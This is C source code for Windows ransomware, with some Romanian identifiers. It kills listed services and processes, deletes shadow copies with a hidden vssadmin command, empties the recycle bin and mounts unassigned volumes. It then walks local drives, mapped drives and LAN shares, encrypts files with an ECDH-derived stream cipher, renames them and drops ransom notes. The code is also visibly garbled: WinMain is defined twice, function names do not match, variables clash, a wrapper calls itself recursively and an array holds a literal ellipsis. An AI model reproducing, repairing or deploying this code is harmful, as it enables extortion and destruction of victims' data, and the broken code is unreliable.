int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    int LAN_MODE = 0;
    int argc = 0;
    LPSTR *argv = CommandLineToArgvA(GetCommandLineA(), &argc);
    if (argc > 1) {
        for (int i = 1; i < argc; ++i) {
            if (!lstrcmpA(argv[i], "-lan1st")) {
                LAN_MODE = 1;
            } else if (!lstrcmpA(argv[i], "-lan2nd")) {
                LAN_MODE = 0;
            } else if (!lstrcmpA(argv[i], "-nolan")) {
                LAN_MODE = -1;
            }
        }
    }
#ifdef DEBUG
    switch (LAN_MODE) {
        case -1:
            printf("Not encrypt LAN!\n");
            break;
        case 0:
            printf("Encrypt LAN after file!\n");
            break;
        case 1:
            printf("Encrypt LAN 1st and then file!\n");
            break;
    }
#endif
    return 0;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SetProcessShutdownParameters(0, 0);
    InitializeCriticalSection(&critSection);
    ServiciuBlocat();
    ProcesBlocat();
    RezerveBlocate();
    SHEmptyRecycleBinW(NULL, NULL, 7);
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    DWORD processorCount = sysInfo.dwNumberOfProcessors * 2;
    DWORD threadCount = 0;
    HANDLE *hThreads = (HANDLE*)HeapAlloc(sysInfo.dwNumberOfProcessors * 8);
    if (hThreads != NULL) {
        ChaKey1Set();
        ECDHPrivKeySetup(VICTIM_ECDH_PRIVATE, ECC_PRV_KEY_SIZE);
        ecdh_generare_chei(VICTIM_ECDH_PUBLIC, VICTIM_ECDH_PRIVATE);
        ecdh_part_secret(VICTIM_ECDH_PRIVATE, MY_ECDH_PUB_KEY, ECDH_SECRET);
        sha256(CHA_FINAL_1, ECDH_SECRET, ECC_PRV_KEY_SIZE);
        sha256(CHA_FINAL_2, ECDH_SECRET, ECC_PUB_KEY_SIZE);
        memcpy(CHA_FINAL, ECDH_SECRET, sizeof(CHA_FINAL));
        WCHAR pubkeypath[MAX_PATH];
        GetEnvironmentVariableW(L"APPDATA", pubkeypath, MAX_PATH);
        lstrcatW(pubkeypath, L"\\pub_k.bin");
#ifdef DEBUG
        if (PathFileExistsW(pubkeypath)) {
            DeleteFileW(pubkeypath);
        }
#endif
        DWORD wb = 0;
        HANDLE hFile = CreateFileW(pubkeypath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            WriteFile(hFile, VICTIM_ECDH_PUBLIC, ECC_PUB_KEY_SIZE, &wb, NULL);
            CloseHandle(hFile);
#ifdef DEBUG
            wprintf(L"Wrote pub key %ls\n", pubkeypath);
#endif
        } else {
#ifdef DEBUG
            wprintf(L"No handle on key path!\n");
#endif
        }
        if (LAN_MODE == 1) {
            SearchLAN(NULL);
        }
        MontarePartiție();
        DWORD drivemask = GetLogicalDrives();
        if (drivemask) {
            for (char i = 'A'; i <= 'Z'; ++i) {
                if ((drivemask & 1) != 0) {
                    WCHAR *drivestring = (WCHAR*)HeapAlloc(14);
                    lstrcpyW(drivestring, L"\\\\?\\");
                    lstrcpyW(drivestring + 5, L":");
                    drivestring[4] = i;
                    DWORD drivetype = GetDriveTypeW(drivestring);
                    if (drivetype != DRIVE_UNKNOWN && drivetype != DRIVE_CDROM) {
                        if (drivetype != DRIVE_REMOTE) {
#ifdef DEBUG
                            wprintf(L"Filetare %ls\n", drivestring);
#endif
                            hThreads[threadCount++] = CreateThread(NULL, 0, SearchFilesThreaded, drivestring, 0, NULL);
                        } else {
                            DWORD nLength = MAX_PATH;
                            WCHAR *numedistanță = (WCHAR*)HeapAlloc(MAX_PATH * 2);
                            if (numedistanță != NULL && !WNetGetConnectionW(drivestring + 4, numedistanță, &nLength)) {
#ifdef DEBUG
                                wprintf(L"Threading Remote %ls\n", drivestring);
#endif
                                hThreads[threadCount++] = CreateThread(NULL, 0, SearchFilesThreaded, numedistanță, 0, NULL);
                            }
                        }
                    } else {
                        HeapFree(drivestring);
                    }
                }
                drivemask >>= 1;
            }
        }
        WaitForMultipleObjects(threadCount, hThreads, TRUE, INFINITE);
        for (int j = 0; j < threadCount; ++j) {
            CloseHandle(hThreads[j]);
        }
        HeapFree(hThreads);
    }
    RezerveBlocate();
    ExitProcess(0);
}
BOOLEAN ChaKey1Set() {
    pdef_RtlGenRandom RtlGenRandom_ = (pdef_RtlGenRandom)GetProcAddress(GetModuleHandleA("advapi32.dll"), "SystemFunction036");
    return RtlGenRandom_ && RtlGenRandom_(CHA_KEY_1, sizeof(CHA_KEY_1));
}
VOID ECDHPrivateKeySet(BYTE *input, int incount) {
    ChaXOR(CHA_KEY_1, 20, CHANONCE_1, CHA_KEY_1, CHA_KEY_1, 44);
    ChaXOR(CHA_KEY_2, 20, CHANONCE_2, CHA_KEY_2, CHA_KEY_2, 44);
    memcpy(input, CHA_KEY_1, incount);
}
VOID MontarePartiție() {
    const char16_t *drives[] = {u"E:\\", u"R:\\", ... , u"Z:\\"};
    LPCWSTR lpszVolumeMountPoint[26];
    int j = 0;
    for (int i = 0; i < ARRAY_SIZE(drives); ++i) {
        if (GetDriveTypeW(drives[i]) == DRIVE_NO_ROOT_DIR) {
            lpszVolumeMountPoint[j++] = drives[i];
        }
    }
    char16_t volumename[MAX_PATH];
    DWORD cchBufferLength = ARRAYSIZE(volumename);
    DWORD cchReturnLength = 0;
    HANDLE hFindVolume = FindFirstVolumeW(volumename, cchBufferLength);
    if (hFindVolume != INVALID_HANDLE_VALUE) {
        do {
            if (!j) {
                break;
            }                
            if (!GetVolumePathNamesForVolumeNameW(volumename, NULL, 0, &cchReturnLength) || lstrlenW(volumename) != 3) {
                SetVolumeMountPointW(lpszVolumeMountPoint[--j], volumename);
            }
        } while (FindNextVolumeW(hFindVolume, volumename, cchBufferLength));
        FindVolumeClose(hFindVolume);
    }
}
VOID ServiciuBlocat()
{
    DWORD dwTimpÎnceput = GetTickCount();
    DWORD dwTimpPauză = 2000;
    SC_HANDLE hSvcManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSvcManager != NULL)
    {
        for (int i = 0; i < ARRAY_SIZE(BLACKLIST_SERVICE); ++i)
        {
            SC_HANDLE hService = OpenServiceA(hSvcManager, BLACKLIST_SERVICE[i], SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS);
            if (hService != NULL)
            {
                SERVICE_STATUS svcStatus;
                if (QueryServiceStatus(hService, &svcStatus))
                {
                    if (svcStatus.dwCurrentState != SERVICE_STOPPED && svcStatus.dwCurrentState != SERVICE_STOP_PENDING)
                    {
                        EnumDependentServicesA(hService, SERVICE_STOPPED, NULL, 0, NULL, NULL);
                        ControlService(hService, SERVICE_CONTROL_STOP, &svcStatus);
                        while (svcStatus.dwCurrentState != SERVICE_STOPPED && GetTickCount() - dwTimpÎnceput <= dwTimpPauză)
                        {
                            Sleep(svcStatus.dwWaitHint);
                            QueryServiceStatus(hService, &svcStatus);
                        }
                    }
                }
                CloseServiceHandle(hService);
            }
        }
        CloseServiceHandle(hSvcManager);
    }
}
VOID ProcesBlocat()
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pEntry;
        pEntry.dwSize = sizeof(pEntry);
        if (Process32FirstW(hSnapShot, &pEntry))
        {
            do
            {
                for (int j = 0; j < ARRAY_SIZE(BLACKLIST_PROCESS); ++j)
                {
                    if (!lstrcmpW(BLACKLIST_PROCESS[j], pEntry.szExeFile))
                    {
                        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pEntry.th32ProcessID);
                        if (hProcess != NULL)
                        {
                            TerminateProcess(hProcess, 9);
                            CloseHandle(hProcess);
                        }
                        break;
                    }
                }
            } while (Process32NextW(hSnapShot, &pEntry));
        }
        CloseHandle(hSnapShot);
    }
}
VOID RezerveBlocate()
{
    PVOID oldValue = NULL;
    if (IsWow64Process())
    {
        pdef_Wow64DisableWow64FsRedirection Wow64DisableWow64FsRedirection_ = (pdef_Wow64DisableWow64FsRedirection)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "Wow64DisableWow64FsRedirection");
        if (Wow64DisableWow64FsRedirection_ != NULL)
        {
            Wow64DisableWow64FsRedirection_(&oldValue);
        }
    }
    ShellExecuteW(NULL, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", 0, SW_HIDE);
    if (IsWow64Process())
    {
        pdef_Wow64RevertWow64FsRedirection Wow64RevertWow64FsRedirection_ = (pdef_Wow64RevertWow64FsRedirection)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "Wow64RevertWow64FsRedirection");
        if (Wow64RevertWow64FsRedirection_ != NULL)
        {
            Wow64RevertWow64FsRedirection_(&oldValue);
        }
    }
}
VOID SearchLAN(LPNETRESOURCEW resourcename)
{
    DWORD memsize = sizeof(LPNETRESOURCEW);
    DWORD rCount = -1;
    HANDLE hEnum;
    if (!WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, RESOURCEUSAGE_ALL, resourcename, &hEnum))
    {
        LPNETRESOURCEW foundresource = (LPNETRESOURCEW)HeapAlloc(memsize);
        if (foundresource != NULL)
        {
            while (!WNetEnumResourceW(hEnum, &rCount, foundresource, &memsize))
            {
                for (DWORD i = 0; i < rCount; ++i)
                {
                    if ((foundresource[i].dwUsage & RESOURCEUSAGE_CONTAINER) != 0)
                    {
                        SearchLAN(&foundresource[i]);
                    }
                    else
                    {
                        SearchFiles(foundresource[i].lpNumedistanță, 0);
                    }
                }
            }
            HeapFree(GetProcessHeap(), 0, foundresource);
        }
        WNetCloseEnum(hEnum);
    }
}
DWORD WINAPI SearchFilesThreaded(LPVOID lpParam)
{
    WCHAR* path = (WCHAR*)lpParam;
    SearchFiles(path, 0);
    HeapFree(GetProcessHeap(), 0, path);
    return 0;
}
VOID SearchFiles(WCHAR *pathname, int layer)
{
    WCHAR pathsearch[MAX_PATH];
    if (pathsearch != NULL)
    {
        swprintf(pathsearch, L"%s\\*", pathname);
        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(pathsearch, &fd);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                BOOL isGood = FALSE;
                for (int i = 0; i < ARRAY_SIZE(BLACKLIST_FILE); ++i)
                {
                    if (!lstrcmpW(fd.cFileName, BLACKLIST_FILE[i]))
                    {
#ifdef DEBUG
                        wprintf(L"Listed file %ls\r\n", fd.cFileName);
#endif
                        isGood = TRUE;
                        break;
                    }
                }
                if (!isGood)
                {
                    swprintf(pathsearch, L"%s\\%s", pathname, fd.cFileName);
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && layer < 16)
                    {
#ifdef DEBUG
                        wprintf(L"Căutare %ls\r\n", pathsearch);
#endif
                        SearchFiles(pathsearch, layer + 1);
                    }
                    else if (lstrcmpW(fd.cFileName, RANSOM_NAME))
                    {
                        for (int j = lstrlenW(fd.cFileName); j > 0; --j)
                        {
                            if (fd.cFileName[j] == '.')
                            {
                                if (!lstrcmpW(&fd.cFileName[j], RANSOM_EXT))
                                {
#ifdef DEBUG
                                    wprintf(L"Sărire peste fișierul %ls\r\n", fd.cFileName);
#endif
                                    isGood = TRUE;
                                    break;
                                }
                            }
                        }
                        if (!isGood)
                        {
#ifdef DEBUG
                            wprintf(L"Criptează fișierul %ls\r\n", pathsearch);
#endif
                            CryptFile(pathsearch);
                        }
                    }
                }
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
            swprintf(pathsearch, L"%s\\%s", pathname, RANSOM_NAME);
            HANDLE hFile = CreateFileW(pathsearch, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE)
            {
#ifdef DEBUG
                wprintf(L"Generează note-ul %ls\r\n", pathsearch);
#endif
                DWORD wb;
                WriteFile(hFile, RANSOM_NOTE, lstrlenA(RANSOM_NOTE), &wb, NULL);
                CloseHandle(hFile);
            }
        }
    }
}
VOID CryptFile(const WCHAR *filename)
{
    HANDLE hFile = CreateFileW(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return;
    }
    SetFileAttributesW(filename, FILE_ATTRIBUTE_NORMAL);
    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    DWORD MărimeBloc = min(fileSize.QuadPart, 10485760 * 3);
    DWORD Blocuri = fileSize.QuadPart / MărimeBloc;
    for (DWORD i = 0; i < Blocuri; ++i)
    {
        DWORD offsetHigh = i * MărimeBloc / 10485760;
        DWORD offsetLow = (i * MărimeBloc) % 10485760;
        HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
        if (hMap != NULL)
        {
            LPBYTE hView = (LPBYTE)MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, offsetHigh, offsetLow, MărimeBloc);
            if (hView != NULL)
            {
                ChaXOR(CHA_FINAL_1, 20, CHA_FINAL, hView, hView, MărimeBloc);
                ChaXOR(CHA_FINAL_2, 20, CHA_FINAL, hView, hView, MărimeBloc);
                UnmapViewOfFile(hView);
            }
            CloseHandle(hMap);
        }
    }
    FlushFileBuffers(hFile);
    CloseHandle(hFile);
    WCHAR newPath[MAX_PATH];
    swprintf(newPath, L"%s%s", filename, RANSOM_EXT);
    MoveFileExW(filename, newPath, MOVEFILE_REPLACE_EXISTING);
}
BOOL IsWow64Process()
{
    BOOL bIsWow = FALSE;
    HMODULE hModule = GetModuleHandleA("kernel32.dll");
    if (hModule != NULL)
    {
        pdef_IsWow64Process IsWow64Process_ = (pdef_IsWow64Process)GetProcAddress(hModule, "IsWow64Process");
        if (IsWow64Process_ != NULL)
        {
            if (!IsWow64Process_(GetCurrentProcess(), &bIsWow))
            {
                bIsWow = FALSE;
            }
        }
    }
    return bIsWow;
}
PCHAR *CommandLineToArgvA(PCHAR CmdLine, int *_argc)
{
    PCHAR *argv;
    PCHAR argv;
    ULONG len;
    ULONG argc;
    CHAR a;
    ULONG i, j;
    BOOLEAN in_QM;
    BOOLEAN in_TEXT;
    BOOLEAN in_SPACE;
    len = strlen(CmdLine);
    i   = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);
    argv  = (PCHAR *)LocalAlloc(LMEM_FIXED, i + (len + 2) * sizeof(CHAR));
    _argv = (PCHAR)(((PUCHAR)argv) + i);
    argc  = 0;
    argv[argc] = _argv;
    in_QM = FALSE;
    in_TEXT  = FALSE;
    in_SPACE = TRUE;
    i = 0;
    j = 0;
    while(a = CmdLine[i])
    {
        if(in_QM)
        {
            if (a == '\"')
            {
                in_QM = FALSE;
            }
            else
            {
                _argv[j] = a;
                j++;
            }
        }
        else
        {
            switch(a)
            {
                case '\"':
                    in_QM   = TRUE;
                    in_TEXT = TRUE;
                    if(in_SPACE)
                    {
                        argv[argc] = _argv + j;
                        argc++;
                    }
                    in_SPACE = FALSE;
                    break;
                case ' ':
                case '\t':
                case '\n':
                case '\r':
                    if(in_TEXT)
                    {
                        _argv[j] = '\0';
                        j++;
                    }
                    in_TEXT  = FALSE;
                    in_SPACE = TRUE;
                    break;
                default:
                    in_TEXT  = TRUE;
                    if(in_SPACE)
                    {
                        argv[argc] = _argv + j;
                        argc++;
                    }
                    _argv[j] = a;
                    j++;
                    in_SPACE = FALSE;
                    break;
            }
        }
        i++;
    }
    _argv[j] = '\0';
    argv[argc] = NULL;
    (*_argc) = argc;
    return argv;
}
LPVOID HeapAlloc(int len)
{
	EnterCriticalSection(&critSection);
	LPVOID lpMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 64);
	LeaveCriticalSection(&critSection);
	return lpMem;
}
VOID HeapFree(LPVOID mem)
{
	EnterCriticalSection(&critSection);
	HeapFree(GetProcessHeap(), 0, mem);
	LeaveCriticalSection(&critSection);
}
